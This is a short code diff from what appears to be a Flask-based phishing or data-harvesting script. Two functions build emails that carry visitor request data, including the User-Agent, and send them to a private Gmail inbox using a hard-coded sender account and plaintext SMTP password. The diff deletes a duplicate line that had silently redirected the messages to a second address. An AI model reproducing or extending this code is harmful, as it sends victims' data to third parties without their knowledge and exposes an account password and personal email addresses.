@@ -148,7 +148,6 @@ def first():
         sender_email = "Sharqiavehicles@sharqiavehicles.com"
         sender_emaill = "Sharqiavehicles"
         receiver_email = "lukeangus1989@gmail.com"
-	receiver_email = "bobxuchina.163@gmail.com"
         password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -187,7 +186,6 @@ def second():
         sender_email = "Sharqiavehicles@sharqiavehicles.com"
         sender_emaill = "Sharqiavehicles"
         receiver_email = "lukeangus1989@gmail.com"
-	receiver_email = "bobxuchina.163@gmail.com"
         password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
